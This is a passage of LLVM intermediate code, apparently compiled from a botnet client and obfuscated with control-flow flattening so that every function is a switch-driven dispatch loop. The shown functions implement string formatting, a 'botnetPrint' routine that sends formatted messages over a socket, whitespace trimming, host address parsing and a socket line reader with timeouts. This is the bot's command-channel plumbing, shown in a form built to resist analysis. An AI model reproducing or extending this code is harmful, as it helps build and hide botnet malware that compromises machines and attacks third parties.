; <label>:34:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -1224540993, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, %36
  store i32 %38, i32* %7, align 4
  store i32 -1224540993, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 -325871581, i32 1612795719
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 48, i32* %10, align 4
  store i32 1612795719, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 -1345824980, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %8, align 4
  %48 = and i32 %47, 1
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 -947415526, i32 1062686242
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 1173337540, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp sgt i32 %53, 0
  %55 = select i1 %54, i32 -1619364080, i32 1277938148
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8**, i8*** %5, align 8
  %58 = load i32, i32* %10, align 4
  call void @printchar(i8** %57, i32 %58)
  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  store i32 -723289791, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %7, align 4
  store i32 1173337540, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 -947415526, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 -1323940371, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %6, align 8
  %68 = load i8, i8* %67, align 1
  %69 = icmp ne i8 %68, 0
  %70 = select i1 %69, i32 -1793370833, i32 623949192
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %5, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  call void @printchar(i8** %72, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %9, align 4
  store i32 1390606630, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %6, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %6, align 8
  store i32 -1323940371, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 -1004023613, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %7, align 4
  %84 = icmp sgt i32 %83, 0
  %85 = select i1 %84, i32 596858984, i32 785212703
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %10, align 4
  call void @printchar(i8** %87, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %9, align 4
  store i32 87548182, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  store i32 -1004023613, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %9, align 4
  ret i32 %95

loopEnd:                                          ; preds = %91, %86, %82, %81, %78, %71, %66, %65, %64, %61, %56, %52, %51, %46, %45, %44, %39, %35, %34, %29, %26, %23, %18, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  store i32 %23, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1490220451, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1490220451, label %first
    i32 2117383682, label %26
    i32 1144753276, label %34
    i32 1659578783, label %38
    i32 521613637, label %42
    i32 1236178698, label %46
    i32 1676790931, label %49
    i32 167050418, label %54
    i32 -952392929, label %58
    i32 -1646975302, label %65
    i32 700984909, label %71
    i32 -774079750, label %80
    i32 -397016180, label %84
    i32 -895964010, label %88
    i32 -971551305, label %93
    i32 1167603288, label %99
    i32 709981632, label %102
    i32 1206814833, label %103
    i32 -1777695373, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %24 = icmp eq i32 %.reload, 0
  %25 = select i1 %24, i32 2117383682, i32 1144753276
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %27, align 1
  %28 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %28, align 1
  %29 = load i8**, i8*** %9, align 8
  %30 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %14, align 4
  %33 = call i32 @prints(i8** %29, i8* %30, i32 %31, i32 %32)
  store i32 %33, i32* %8, align 4
  store i32 -1777695373, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 1659578783, i32 1676790931
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 10
  %41 = select i1 %40, i32 521613637, i32 1676790931
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 0
  %45 = select i1 %44, i32 1236178698, i32 1676790931
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %47 = load i32, i32* %10, align 4
  %48 = sub nsw i32 0, %47
  store i32 %48, i32* %21, align 4
  store i32 1676790931, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %51 = getelementptr inbounds i8, i8* %50, i64 12
  %52 = getelementptr inbounds i8, i8* %51, i64 -1
  store i8* %52, i8** %17, align 8
  %53 = load i8*, i8** %17, align 8
  store i8 0, i8* %53, align 1
  store i32 167050418, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %21, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 -952392929, i32 -774079750
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %21, align 4
  %60 = load i32, i32* %11, align 4
  %61 = urem i32 %59, %60
  store i32 %61, i32* %18, align 4
  %62 = load i32, i32* %18, align 4
  %63 = icmp sge i32 %62, 10
  %64 = select i1 %63, i32 -1646975302, i32 700984909
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, 48
  %68 = sub nsw i32 %67, 10
  %69 = load i32, i32* %18, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %18, align 4
  store i32 700984909, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 48
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %17, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 -1
  store i8* %76, i8** %17, align 8
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* %21, align 4
  %79 = udiv i32 %78, %77
  store i32 %79, i32* %21, align 4
  store i32 167050418, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %19, align 4
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 -397016180, i32 1206814833
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 -895964010, i32 1167603288
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %14, align 4
  %90 = and i32 %89, 2
  %91 = icmp ne i32 %90, 0
  %92 = select i1 %91, i32 -971551305, i32 1167603288
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %94, i32 45)
  %95 = load i32, i32* %20, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %20, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %13, align 4
  store i32 709981632, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 -1
  store i8* %101, i8** %17, align 8
  store i8 45, i8* %101, align 1
  store i32 709981632, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 1206814833, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %20, align 4
  %105 = load i8**, i8*** %9, align 8
  %106 = load i8*, i8** %17, align 8
  %107 = load i32, i32* %13, align 4
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @prints(i8** %105, i8* %106, i32 %107, i32 %108)
  %110 = add nsw i32 %104, %109
  store i32 %110, i32* %8, align 4
  store i32 -1777695373, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  ret i32 %112

loopEnd:                                          ; preds = %103, %102, %99, %93, %88, %84, %80, %71, %65, %58, %54, %49, %46, %42, %38, %34, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %.reg2mem = alloca i8**
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  store i8** %5, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 -190248058, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -190248058, label %first
    i32 -1702540932, label %8
    i32 -1038502547, label %16
    i32 809072332, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %6 = icmp ne i8** %.reload, null
  %7 = select i1 %6, i32 -1702540932, i32 -1038502547
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = trunc i32 %9 to i8
  %11 = load i8**, i8*** %3, align 8
  %12 = load i8*, i8** %11, align 8
  store i8 %10, i8* %12, align 1
  %13 = load i8**, i8*** %3, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %13, align 8
  store i32 809072332, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast i32* %4 to i8*
  %18 = call i64 @write(i32 1, i8* %17, i64 1)
  store i32 809072332, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

declare i64 @write(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @botnetPrint(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #3
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #9
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #3
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #5

declare i64 @send(i32, i8*, i64, i32) #2

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 865146622, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 865146622, label %10
    i32 1256642498, label %26
    i32 -610937505, label %29
    i32 1037007613, label %30
    i32 -487859039, label %35
    i32 711014880, label %50
    i32 -1386237221, label %52
    i32 2036591822, label %55
    i32 578429950, label %57
    i32 627878138, label %62
    i32 1496582511, label %74
    i32 -1690617153, label %77
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = call i16** @__ctype_b_loc() #10
  %12 = load i16*, i16** %11, align 8
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i16, i16* %12, i64 %19
  %21 = load i16, i16* %20, align 2
  %22 = zext i16 %21 to i32
  %23 = and i32 %22, 8192
  %24 = icmp ne i32 %23, 0
  %25 = select i1 %24, i32 1256642498, i32 -610937505
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32, i32* %4, align 4
  %28 = add nsw i32 %27, 1
  store i32 %28, i32* %4, align 4
  store i32 865146622, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  store i32 1037007613, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %5, align 4
  %32 = load i32, i32* %4, align 4
  %33 = icmp sge i32 %31, %32
  %34 = select i1 %33, i32 -487859039, i32 711014880
  store i32 %34, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = call i16** @__ctype_b_loc() #10
  %37 = load i16*, i16** %36, align 8
  %38 = load i8*, i8** %2, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i8, i8* %41, align 1
  %43 = sext i8 %42 to i32
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i16, i16* %37, i64 %44
  %46 = load i16, i16* %45, align 2
  %47 = zext i16 %46 to i32
  %48 = and i32 %47, 8192
  %49 = icmp ne i32 %48, 0
  store i32 711014880, i32* %switchVar
  store i1 %49, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %51 = select i1 %.reload, i32 -1386237221, i32 2036591822
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %5, align 4
  %54 = add nsw i32 %53, -1
  store i32 %54, i32* %5, align 4
  store i32 1037007613, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* %4, align 4
  store i32 %56, i32* %3, align 4
  store i32 578429950, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %3, align 4
  %59 = load i32, i32* %5, align 4
  %60 = icmp sle i32 %58, %59
  %61 = select i1 %60, i32 627878138, i32 -1690617153
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = load i8*, i8** %2, align 8
  %69 = load i32, i32* %3, align 4
  %70 = load i32, i32* %4, align 4
  %71 = sub nsw i32 %69, %70
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds i8, i8* %68, i64 %72
  store i8 %67, i8* %73, align 1
  store i32 1496582511, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i32, i32* %3, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %3, align 4
  store i32 578429950, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i8*, i8** %2, align 8
  %79 = load i32, i32* %3, align 4
  %80 = load i32, i32* %4, align 4
  %81 = sub nsw i32 %79, %80
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %78, i64 %82
  store i8 0, i8* %83, align 1
  ret void

loopEnd:                                          ; preds = %74, %62, %57, %55, %52, %50, %35, %30, %29, %26, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readnone
declare i16** @__ctype_b_loc() #6

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #3
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -1462535622, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1462535622, label %first
    i32 -1062176048, label %13
    i32 -1953344508, label %14
    i32 -1741603914, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 -1062176048, i32 -1953344508
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 -1741603914, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -1741603914, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %switchVar = alloca i32
  store i32 -172565487, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -172565487, label %24
    i32 1379595117, label %33
    i32 -779438550, label %50
    i32 1259797336, label %51
    i32 1861607214, label %55
    i32 -544130101, label %58
    i32 1510411898, label %67
    i32 1726805823, label %84
    i32 -197008127, label %87
    i32 -1817222378, label %88
    i32 407176308, label %89
    i32 1794310777, label %91
    i32 776782772, label %96
    i32 1887834448, label %101
    i32 -221342573, label %103
    i32 426518864, label %111
    i32 766234879, label %112
    i32 -382732012, label %115
    i32 -1404859904, label %118
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #3, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  store i32 1379595117, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  %49 = select i1 %48, i32 -779438550, i32 407176308
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 1259797336, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %13, align 4
  %53 = icmp slt i32 %52, 10
  %54 = select i1 %53, i32 1861607214, i32 -1817222378
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %56, align 8
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %57, align 8
  store i32 -544130101, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %59, i64 0, i64 0
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %60) #3, !srcloc !2
  %62 = extractvalue { i64, i64* } %61, 0
  %63 = extractvalue { i64, i64* } %61, 1
  %64 = trunc i64 %62 to i32
  store i32 %64, i32* %14, align 4
  %65 = ptrtoint i64* %63 to i64
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %15, align 4
  store i32 1510411898, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %5, align 4
  %69 = srem i32 %68, 64
  %70 = zext i32 %69 to i64
  %71 = shl i64 1, %70
  %72 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %73 = load i32, i32* %5, align 4
  %74 = sdiv i32 %73, 64
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %72, i64 0, i64 %75
  %77 = load i64, i64* %76, align 8
  %78 = or i64 %77, %71
  store i64 %78, i64* %76, align 8
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  %81 = call i32 @select(i32 %80, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %81, i32* %12, align 4
  %82 = icmp sle i32 %81, 0
  %83 = select i1 %82, i32 1726805823, i32 -197008127
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %13, align 4
  store i32 1259797336, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 -1817222378, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 407176308, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
